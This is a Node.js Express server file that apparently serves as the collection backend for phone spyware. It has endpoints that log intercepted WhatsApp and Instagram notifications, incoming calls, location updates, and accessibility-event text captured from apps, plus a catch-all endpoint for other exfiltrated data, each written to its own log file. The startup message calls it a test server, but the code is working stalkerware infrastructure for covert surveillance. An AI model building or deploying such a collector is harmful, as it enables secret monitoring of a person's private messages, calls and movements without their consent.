const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const port = 3001;

// Define separate log files
const LOGS = {
  NOTIFICATION: path.join(__dirname, "messages.log"),
  CALL: path.join(__dirname, "calls.log"),
  LOCATION: path.join(__dirname, "location.log"),
  ACCESSIBILITY: path.join(__dirname, "accessibility.log"),
  GENERAL: path.join(__dirname, "general.log"),
};

// Helper function to write incoming data to a specific file
function writeLogToFile(logPath, type, data) {
  const timestamp = new Date().toISOString();
  const logEntry = `\n==================================\n[${timestamp}] ${type}\n==================================\n${JSON.stringify(data, null, 2)}\n`;

  fs.appendFile(logPath, logEntry, (err) => {
    if (err) {
      console.error(`Failed to write to ${logPath}:`, err);
    }
  });
}

// Middleware to parse JSON bodies
app.use(express.json());

// Log all incoming requests to the console
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Endpoint for Notifications (WhatsApp/Instagram)
app.post("/notification", (req, res) => {
  console.log("--- NEW MESSAGE INTERCEPTED ---");
  console.log(JSON.stringify(req.body, null, 2));

  writeLogToFile(LOGS.NOTIFICATION, "NEW MESSAGE", req.body);

  res.status(200).send({ status: "ok" });
});

// Endpoint for Location Updates
app.post("/location", (req, res) => {
  console.log("--- NEW LOCATION UPDATE ---");
  // We log location to console but keep it separate in file
  writeLogToFile(LOGS.LOCATION, "NEW LOCATION", req.body);

  res.status(200).send({ status: "ok" });
});

// Endpoint for Incoming Calls
app.post("/call", (req, res) => {
  console.log("--- NEW INCOMING CALL ---");
  console.log(JSON.stringify(req.body, null, 2));

  writeLogToFile(LOGS.CALL, "NEW INCOMING CALL", req.body);

  res.status(200).send({ status: "ok" });
});

// Endpoint for Accessibility Events (Text changes in apps)
app.post("/accessibility", (req, res) => {
  console.log("--- ACCESSIBILITY EVENT ---");
  console.log(JSON.stringify(req.body, null, 2));

  writeLogToFile(LOGS.ACCESSIBILITY, "ACCESSIBILITY EVENT", req.body);

  res.status(200).send({ status: "ok" });
});

// Generic catch-all for any other data
app.post("*", (req, res) => {
  console.log("--- OTHER DATA RECEIVED ---");
  writeLogToFile(LOGS.GENERAL, `OTHER DATA (${req.url})`, req.body);
  res.status(200).send({ status: "ok" });
});

app.listen(port, () => {
  console.log(`Test API server listening at http://localhost:${port}`);
  console.log(`Logging Messages to: messages.log`);
  console.log(`Logging Calls to: calls.log`);
  console.log(`Logging Location to: location.log`);
  console.log(`Logging Accessibility to: accessibility.log`);
});
